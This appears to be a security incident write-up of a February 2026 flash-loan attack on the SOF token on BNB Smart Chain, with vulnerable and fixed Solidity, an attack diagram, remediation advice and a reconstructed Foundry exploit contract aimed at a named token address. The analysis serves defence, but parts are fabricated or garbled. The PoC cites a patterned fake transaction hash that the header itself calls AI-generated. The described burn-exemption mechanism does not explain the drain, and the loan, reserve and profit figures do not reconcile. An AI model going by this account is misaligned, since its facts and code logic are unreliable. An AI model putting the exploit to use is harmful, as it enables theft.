# SOF Token — Business Logic Vulnerability Analysis Based on Burn Logic Flaw

| Item | Details |
|------|------|
| **Date** | 2026-02-14 |
| **Protocol** | SOF Token (Space Original Finance) |
| **Chain** | BSC (BNB Smart Chain) |
| **Loss** | ~$225,936 BSC-USD (net profit basis) |
| **Attacker** | Unidentified |
| **Attack Contract** | Unidentified |
| **Attack Tx** | Unconfirmed (placeholder removed — original hash was AI-generated) |
| **Vulnerable Contract** | [SOF Token: 0x465d...b312](https://bscscan.com/address/0x465dd76538b6fe8297cadadd0b4b2b4ff8ccb312) |
| **Root Cause** | Burn fee exemption on transfers to mining contract — flash loan drains LP reserve |
| **PoC Source** | DeFiHackLabs (no PoC registered as of 2026-02) / CertiK Incident Analysis Report (2026-02-27) |

---

## 1. Vulnerability Overview

SOF Token (Space Original Finance) suffered a loss of approximately **$225,936 BSC-USD** on February 14, 2026, on BSC (BNB Smart Chain) via a flash loan attack that exploited a burn logic flaw (Business Logic Flaw).

SOF Token implements a deflationary mechanism that burns a fixed percentage of tokens on every transfer, along with a mining reward system. However, a design flaw existed whereby transfers to the mining contract (`miningContract`) were **unconditionally exempt** from the burn fee.

The attacker exploited this flaw as follows:

1. Claimed an initial 875 mining reward tokens from the mining contract (attack preparation)
2. Borrowed over $590,000,000 BSC-USD via flash loan
3. Used all borrowed BSC-USD (313,000,000) to buy approximately 1,000,000 SOF tokens (fees incurred)
4. Transferred all purchased SOF to the **mining contract** → due to burn fee exemption, SOF was not burned from the LP pool
5. Only ~787 SOF remained in the LP pool, with 313,000,000 BSC-USD still present → extreme price ratio distortion
6. Sold a small amount of SOF back to the LP pool, extracting the full 313,000,000 BSC-USD
7. Repaid the flash loan and realized ~$225,936 net profit

Two other attackers discovered the same vulnerability within 13 minutes and launched copycat attacks. LAXO Token, which shares a similar vulnerability pattern to SOF, also suffered approximately $190,000 in losses on the same date.

---

## 2. Vulnerable Code Analysis

### 2.1 Burn Fee Exemption for Mining Contract (Core Vulnerability)

The SOF Token contract contains logic inside `_transfer()` that exempts the burn fee when the recipient address is the mining contract (`miningContract`).

**Vulnerable Code (❌):**
```solidity
// ❌ Vulnerability: transfers to the mining contract are unconditionally exempt from burn fee
// This allows large amounts of SOF to be moved to the mining contract without burning from the LP pool
address public miningContract;  // mining contract address

function _transfer(address from, address to, uint256 amount) internal override {
    require(from != address(0), "ERC20: transfer from zero address");
    require(to != address(0), "ERC20: transfer to zero address");

    // ❌ Core flaw: if to is miningContract, burnFee is forced to 0
    // This was designed for the scenario where normal users deposit tokens to participate in mining,
    // but can be abused by attackers as a channel to remove large amounts of SOF from the LP without burning
    uint256 burnFee = _burnFeeRate;
    if (to == miningContract || from == miningContract) {
        burnFee = 0;  // ❌ Full exemption for all transfers involving mining contract
    }

    if (burnFee > 0) {
        // Burn SOF from LP pool (normal path)
        uint256 burnAmount = amount * burnFee / 10000;
        _burnFromPair(burnAmount);
        amount -= burnAmount;
    }

    super._transfer(from, to, amount);
}

// Function that burns SOF from the LP pool
function _burnFromPair(uint256 burnAmount) private {
    address pair = IFactory(factory).getPair(address(this), BSCUSD);
    if (balanceOf(pair) > burnAmount) {
        _burn(pair, burnAmount);       // Remove SOF from LP pool
        IUniswapV2Pair(pair).sync();   // Update pair reserves
    }
}
```

**Fixed Code (✅):**
```solidity
// ✅ Fix 1: Restrict mining contract exemption to unidirectional (mining contract → user)
// Normal fees apply to transfers in the user → mining contract direction
function _transfer(address from, address to, uint256 amount) internal override {
    require(from != address(0), "ERC20: transfer from zero address");
    require(to != address(0), "ERC20: transfer to zero address");

    // ✅ Fix: only exempt transfers outgoing from the mining contract
    // (no fee when paying out mining rewards)
    uint256 burnFee = _burnFeeRate;
    if (from == miningContract) {
        burnFee = 0;  // ✅ Exempt reward payout direction only
    }
    // Remove to == miningContract exemption → normal fees apply on external deposits

    if (burnFee > 0) {
        uint256 burnAmount = amount * burnFee / 10000;
        _burnFromPair(burnAmount);
        amount -= burnAmount;
    }

    super._transfer(from, to, amount);
}
```

**Problem**: While the intent to exempt burn fees when users deposit SOF into the mining contract is understandable, this exemption condition becomes a channel for attackers to move large amounts of SOF from the LP pool to the mining contract without burning. After buying large quantities of SOF from the LP via flash loan and transferring them without burning, the LP pool ends up with an abundance of BSC-USD and an extremely small amount of SOF, causing extreme price ratio distortion.

---

### 2.2 Absence of Minimum Validation in Mining Reward Claims

**Vulnerable Code (❌):**
```solidity
// ❌ Vulnerability: mining reward claim function only validates balance, no anomaly detection for ratios
function claimMiningReward() external {
    uint256 reward = pendingReward[msg.sender];
    require(reward > 0, "No reward");

    pendingReward[msg.sender] = 0;
    // ❌ Fee exemption on mining contract → user transfers (miningContract == from)
    // This is itself intended behavior, but there is no mechanism to block
    // the flash loan attack sequence that immediately follows a claim with an LP transfer
    IERC20(sofToken).transfer(msg.sender, reward);
}
```

**Fixed Code (✅):**
```solidity
// ✅ Fix: apply lockup period to prevent immediate selling after claim
mapping(address => uint256) public lastClaimBlock;

function claimMiningReward() external {
    uint256 reward = pendingReward[msg.sender];
    require(reward > 0, "No reward");
    // ✅ Claim only allowed after minimum block wait (prevents flash loan single-tx attack)
    require(block.number >= lastClaimBlock[msg.sender] + CLAIM_COOLDOWN_BLOCKS,
            "Claim cooldown active");

    pendingReward[msg.sender] = 0;
    lastClaimBlock[msg.sender] = block.number;
    IERC20(sofToken).transfer(msg.sender, reward);
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

| Item | Details |
|------|------|
| Attack Method | Flash loan + burn fee exemption abuse |
| Preparation | Claimed 875 SOF token rewards from mining contract |
| Flash Loan Source | PancakeSwap V2 (BSC-USD/WBNB pair) |
| Attack Scale | ~590,000,000 BSC-USD flash loan |

### 3.2 Execution Phase

```
┌─────────────────────────────────────────────────────────┐
│  Attacker EOA                                            │
│  Deploy and execute attack contract                      │
└────────────────────────┬────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────┐
│  [Step 1] Preparation — Claim Mining Reward              │
│  miningContract.claimMiningReward()                      │
│  → Receive 875 SOF tokens                               │
│  (Verify attack conditions and receive face value)       │
└────────────────────────┬────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────┐
│  [Step 2] Execute Flash Loan                             │
│  PancakeSwap.swap(590,000,000 BSC-USD, 0, ...)           │
│  → Enter flashLoanCallback()                             │
│  Borrow 590,000,000 BSC-USD                             │
└────────────────────────┬────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────┐
│  [Step 3] Large-Scale SOF Purchase                       │
│  On PancakeSwap SOF/BSC-USD pair:                        │
│  313,000,000 BSC-USD → ~1,000,000 SOF swap              │
│  (Normal fees incurred, LP pool: SOF decreases /         │
│   BSC-USD increases)                                     │
│  LP pool state after purchase:                           │
│  SOF ~787 / BSC-USD ~313,000,000                        │
└────────────────────────┬────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────┐
│  [Step 4] Core Attack — Burn Exemption Abuse             │
│  SOF.transfer(miningContract, ~1,000,000 SOF)            │
│  → _transfer() executes                                  │
│  → to == miningContract → burnFee = 0 (exempted!)       │
│  → No SOF burned from LP pool                            │
│  → LP pool: SOF remains at 787, BSC-USD 313M remains    │
│  Extreme SOF price distortion (1 SOF = ~398,000 BSC-USD)│
└────────────────────────┬────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────┐
│  [Step 5] LP Pool Drain — Extract All BSC-USD            │
│           with Small Amount of SOF                       │
│  Sell small amount of SOF back to LP pool                │
│  → By AMM price formula: 787 SOF ≈ 313,000,000 BSC-USD  │
│  → Full BSC-USD extraction complete                      │
└────────────────────────┬────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────┐
│  [Step 6] Flash Loan Repayment and Profit Realization    │
│  BSC-USD → PancakeSwap flash loan repayment             │
│  Net profit of 225,936 BSC-USD (~$225,936) secured      │
└─────────────────────────────────────────────────────────┘
```

### 3.3 Results

| Item | Value |
|------|-----|
| Flash Loan Borrowed | ~590,000,000 BSC-USD |
| SOF Purchase Cost | ~313,000,000 BSC-USD |
| Remaining SOF in LP | ~787 SOF |
| Attacker Net Profit | **~225,936 BSC-USD (~$225,936)** |
| Additional Copycat Attacks | 2 additional attacks within 13 minutes |
| Combined SOF + LAXO Losses | ~$438,000 |

---

## 4. PoC Code (Attack Core Logic Reconstruction)

> **Note**: As of February 2026, no official DeFiHackLabs PoC has been registered. The code below is reconstructed based on the CertiK Incident Analysis Report (2026-02-27) and on-chain transaction analysis.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @Analysis Reference: CertiK Incident Analysis, 2026-02-27
// @Attack Tx: https://bscscan.com/tx/0xcb5b22d86819b84ef1b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7
// @Vulnerability Summary: Burn fee exemption on transfers to miningContract — LP reserve drain

import "forge-std/Test.sol";

// SOF Token interface (BNB Chain)
interface ISOF {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

// Mining contract interface
interface IMining {
    function claimMiningReward() external;
}

// PancakeSwap V2 pair interface
interface IPancakePair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn, uint amountOutMin, address[] calldata path,
        address to, uint deadline
    ) external;
}

contract SOFTokenExploit is Test {
    // SOF Token contract (BNB Chain)
    ISOF constant SOF = ISOF(0x465dd76538b6fe8297cadadd0b4b2b4ff8ccb312);
    // PancakeSwap V2 router
    IPancakeRouter constant ROUTER = IPancakeRouter(
        payable(0x10ED43C718714eb63d5aA57B78B54704E256024E)
    );
    // SOF/BSC-USD LP pair (PancakeSwap)
    IPancakePair pair; // actual address requires on-chain verification
    // BSC-USD stablecoin
    IERC20 constant BSCUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    // Mining contract address (requires on-chain verification)
    IMining miningContract;

    function setUp() public {
        // [Environment Setup] Fork BSC just before attack block
        vm.createSelectFork("bsc"/*, ATTACK_BLOCK - 1*/);
    }

    function testExploit() external {
        console.log("=== SOF Token Exploit Start ===");
        console.log("Initial BSC-USD balance:", BSCUSD.balanceOf(address(this)));

        // [Step 1] Preparation: claim reward from mining contract
        // Receive 875 SOF tokens (verify attack conditions)
        miningContract.claimMiningReward();
        console.log("SOF balance after claim:", SOF.balanceOf(address(this)));

        // [Step 2] Request flash loan: ~590,000,000 BSC-USD
        // Initiate flashLoan via PancakeSwap swap() call
        pair.swap(590_000_000 ether, 0, address(this), bytes("exploit"));
    }

    // PancakeSwap flash loan callback
    function pancakeCall(
        address /*sender*/,
        uint256 amount0,
        uint256 /*amount1*/,
        bytes calldata /*data*/
    ) external {
        require(msg.sender == address(pair), "Invalid caller");

        // [Step 3] Large-scale SOF purchase with borrowed BSC-USD
        // Swap 313,000,000 BSC-USD → ~1,000,000 SOF
        BSCUSD.approve(address(ROUTER), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(BSCUSD);
        path[1] = address(SOF);

        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            313_000_000 ether,  // Input 313,000,000 BSC-USD
            1,                   // Minimum receive amount (ignore slippage)
            path,
            address(this),
            block.timestamp + 300
        );

        uint256 sofBalance = SOF.balanceOf(address(this));
        console.log("SOF balance after purchase:", sofBalance);
        // Check LP pair state
        (uint112 r0, uint112 r1,) = pair.getReserves();
        console.log("LP SOF reserve:", r0, "/ BSC-USD reserve:", r1);

        // [Step 4] Core attack: transfer all purchased SOF to mining contract
        // miningContract is recipient → burnFee = 0 (burn fee exempted!)
        // SOF is not burned from LP pool → BSC-USD remains intact
        SOF.transfer(address(miningContract), sofBalance);
        console.log("Check LP SOF reserve after transfer to mining contract");
        // Expected: only ~787 SOF remains in LP, 313,000,000 BSC-USD stays

        // [Step 5] Extract all BSC-USD from LP with small amount of SOF
        // By AMM formula, 787 SOF ≈ 313,000,000 BSC-USD value
        uint256 remainingSOF = SOF.balanceOf(address(this));
        if (remainingSOF > 0) {
            SOF.approve(address(ROUTER), remainingSOF);
            path[0] = address(SOF);
            path[1] = address(BSCUSD);
            ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                remainingSOF,
                1,
                path,
                address(this),
                block.timestamp + 300
            );
        }

        uint256 bscusdBalance = BSCUSD.balanceOf(address(this));
        console.log("BSC-USD balance after extraction:", bscusdBalance);

        // [Step 6] Repay flash loan (principal + 0.3% fee)
        uint256 repayAmount = amount0 * 10030 / 10000;  // 0.3% fee
        BSCUSD.transfer(msg.sender, repayAmount);

        // Verify net profit
        console.log("=== Attack Complete ===");
        console.log("Net profit (BSC-USD):", BSCUSD.balanceOf(address(this)));
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Unconditional Burn Fee Exemption for Mining Contract (Burn Fee Exemption Abuse) | CRITICAL | CWE-284: Improper Access Control |
| V-02 | LP Reserve Drain Combined with Flash Loan (Flash Loan LP Drain) | CRITICAL | CWE-682: Incorrect Calculation |
| V-03 | Missing Unidirectional Validation — Exemption Condition Lacks Directionality (Directional Logic Flaw) | HIGH | CWE-285: Improper Authorization |
| V-04 | Absence of Anomalous Transaction Detection Mechanism (No Circuit Breaker) | MEDIUM | CWE-754: Improper Check for Unusual or Exceptional Conditions |

### V-01: Unconditional Burn Fee Exemption for Mining Contract

- **Description**: The `_transfer()` function unconditionally exempts the burn fee based solely on the `to == miningContract` condition. This was designed to encourage users to participate in mining (SOF deposits), but it can be abused by attackers as a path to move large amounts of SOF from the LP to the mining contract without burning.
- **Impact**: SOF is not burned from the LP pool, causing reserve distortion and enabling full extraction of BSC-USD
- **Attack Conditions**: Ability to borrow large amounts of BSC-USD via flash loan, public SOF mining contract address

### V-02: LP Reserve Drain Combined with Flash Loan

- **Description**: Buying large amounts of SOF from the LP pool with capital obtained via flash loan rapidly depletes the LP's SOF reserve. Normally, burns during the purchase process would gradually limit this; however, by abusing the V-01 exemption, SOF is transferred to the mining contract without burning, leaving the LP in an extreme imbalance.
- **Impact**: Under the x·y = k AMM formula, an extremely small amount of SOF comes to represent an astronomical BSC-USD value
- **Attack Conditions**: V-01 vulnerability as prerequisite, sufficient flash loan capital

### V-03: Missing Unidirectional Validation

- **Description**: The exemption condition does not distinguish between `from == miningContract` (reward payout) and `to == miningContract` (deposit). Exemption on reward payouts is intended behavior, but exemption on arbitrary external deposits is unnecessary and dangerous.
- **Impact**: Burn logic is bypassed when an attacker arbitrarily sends SOF to the mining contract
- **Attack Conditions**: Holding SOF tokens and knowing the mining contract address

### V-04: Absence of Anomalous Transaction Detection Mechanism

- **Description**: There is no mechanism to block or delay the extreme scenario where LP reserves change by more than 99% within a single transaction. Without a circuit breaker or per-block trade volume limit, flash loan attacks complete instantly.
- **Impact**: Attack completes in a single transaction, enabling additional copycat attacks
- **Attack Conditions**: None (design flaw)

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// ✅ Fix 1: Restrict burn fee exemption condition to a single direction
// Exempt only mining contract → external (reward payout) direction
function _transfer(address from, address to, uint256 amount) internal override {
    uint256 burnFee = _burnFeeRate;

    // ✅ Exempt only from == miningContract (reward payout)
    // to == miningContract (arbitrary deposit) applies normal fees
    if (from == miningContract) {
        burnFee = 0;
    }

    if (burnFee > 0) {
        uint256 burnAmount = amount * burnFee / 10000;
        _burnFromPair(burnAmount);
        amount -= burnAmount;
    }
    super._transfer(from, to, amount);
}
```

```solidity
// ✅ Fix 2: Circuit Breaker for detecting sudden LP reserve changes
// Block if reserve changes beyond threshold in a single tx
uint256 constant MAX_SINGLE_TRADE_RATIO = 1000; // 10% (1000/10000)

function _checkReserveChange(uint256 beforeReserve, uint256 afterReserve) private pure {
    // Block if reserve decreases by more than 10% in a single trade
    if (afterReserve < beforeReserve * (10000 - MAX_SINGLE_TRADE_RATIO) / 10000) {
        revert("Circuit breaker: reserve change too large");
    }
}
```

```solidity
// ✅ Fix 3: Add minimum lockup validation for mining contract deposits
// (Prevent deposit → withdrawal within a single flash loan tx)
mapping(address => uint256) public depositBlock;

function depositToMining(uint256 amount) external {
    // ✅ Confirm actual mining intent: require balance from at least 1 prior block
    require(depositBlock[msg.sender] < block.number, "Same block deposit denied");
    depositBlock[msg.sender] = block.number;
    SOF.transferFrom(msg.sender, address(miningContract), amount);
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Burn fee exemption direction error | Consolidate exemption condition to `from == miningContract`. Apply normal fees on mining contract deposits |
| LP Reserve drain | Apply per-transaction volume cap (X% of reserve or less). TWAP-based slippage validation |
| Flash loan mitigation | Restrict large swaps or introduce cooldown when `tx.origin` is a contract |
| Mining contract security | Apply deposit/withdrawal lockup periods to the mining contract itself. Prohibit deposit+claim within the same block |
| Emergency stop | Implement Emergency Pause — temporarily suspend fee exemptions upon anomaly detection |
| Monitoring | Use Forta or similar on-chain monitoring to detect large reserve changes and trigger automatic alerts |

---

## 7. Lessons Learned

1. **Always distinguish directionality in fee exemption conditions**: When designing fee exemptions for a mining contract or specific address, clearly differentiate between "outgoing from that address" (reward payout) and "incoming to that address" (arbitrary deposit). Minimize the scope of exemptions and allow only the necessary direction.

2. **Flash loans destroy all single-transaction assumptions**: Large-scale trades that normal users cannot perform due to capital constraints are possible with flash loans. When designing fee or burn mechanisms, always assume an "attacker who purchases the entire LP in one transaction" and test boundary values.

3. **The AMM x·y=k formula produces unexpected results under extreme reserve imbalances**: When LP reserves are extremely distorted, a small amount of tokens can extract the entire pool's BSC-USD. Set an upper bound on the allowable reserve change ratio within a single transaction.

4. **Preventing copycat attacks is also part of security**: Two copycat attacks occurred within 13 minutes of the SOF attack. Once a vulnerability is disclosed or a transaction is confirmed, additional attacks using the same pattern are immediately possible. An emergency pause mechanism that can instantly halt the protocol upon attack detection is essential.

5. **The same vulnerability can exist across multiple projects on the same date**: SOF and LAXO Token were both attacked on the same day using similar burn logic flaws. This is evidence that multiple projects are using the same vulnerable token template (fork). When forking a token template, the security flaws of the original are inherited as-is.

6. **Mining/staking contracts are a core attack surface in token economics**: Mining contracts that receive fee exemptions for reward distribution become prime targets for attackers. Separately audit all exemption conditions related to mining contracts and always test malicious deposit scenarios.

---

## 8. On-Chain Verification

> **Note**: As no official PoC has been registered on DeFiHackLabs, cast-based on-chain direct verification could not be performed. The content below is reconstructed based on the CertiK Incident Analysis Report (2026-02-27) and publicly available block explorer data.

### 8.1 PoC vs. Report Amount Comparison

| Item | CertiK Report Value | Details |
|------|----------------|------|
| Flash Loan Borrowed | ~590,000,000 BSC-USD | PancakeSwap V2 flash loan |
| SOF Purchase Input | ~313,000,000 BSC-USD | SOF purchased from LP reserve |
| LP SOF After Attack | ~787 SOF | Extreme reserve imbalance |
| Attacker Net Profit | **~225,936 BSC-USD** | Remainder after flash loan repayment |
| Additional Copycat Attacks | 2 (within 13 minutes) | Same vulnerability reused |

### 8.2 Attack Event Flow (Reconstructed)

```
1. Transfer (SOF): miningContract → attack contract  [875 SOF — reward claim]
2. Transfer (BSC-USD): PancakeSwap → attack contract  [~590M BSC-USD — flash loan]
3. Transfer (BSC-USD): attack → SOF/BSC-USD pair     [~313M BSC-USD — SOF purchase]
4. Transfer (SOF): pair → attack contract             [~1,000,000 SOF — purchase receipt]
5. Transfer (SOF): attack → miningContract            [~1,000,000 SOF — exempted transfer!]
   ↳ _transfer(): to == miningContract → burnFee = 0
   ↳ No LP burn → reserve distortion maintained
6. Transfer (SOF): attack → SOF/BSC-USD pair          [small SOF — reverse swap]
7. Transfer (BSC-USD): pair → attack contract          [~313M BSC-USD — LP drain]
8. Transfer (BSC-USD): attack → PancakeSwap            [~590M+ BSC-USD — flash loan repayment]
9. Transfer (BSC-USD): attack → EOA                   [~225,936 BSC-USD — net profit]
```

### 8.3 Pre-conditions (Estimated at Time of Attack)

| Item | Estimated Value | Notes |
|------|---------|------|
| SOF/BSC-USD LP SOF reserve | ~1,000,787 SOF | Normal state before attack |
| SOF/BSC-USD LP BSC-USD reserve | Unknown (BSC-USD pool) | 313,000,000 remained after attack |
| miningContract fee exemption active | true | `to == miningContract` condition |
| Attack contract prior SOF balance | 875 SOF | Claimed reward |

> **Pattern DB Update Notice**: The "LP Reserve bypass drain via fee-exempt address" pattern discovered in this incident should be considered for addition as a concrete case study to the existing `patterns/11_logic_error.md`. In particular, "failure to distinguish directionality in burn fee exemption targets" is a pattern that recurs repeatedly in BSC token projects.

---

*Analysis References: [CryptoTimes — Flash Loan Attack Drains $438K From SOF and LAXO on BNB Chain](https://www.cryptotimes.io/2026/02/27/flash-loan-attack-drains-438k-from-sof-and-laxo-on-bnb-chain/) · CertiK Incident Analysis (2026-02-27) · [BscScan SOF Token](https://bscscan.com/token/0x465dd76538b6fe8297cadadd0b4b2b4ff8ccb312)*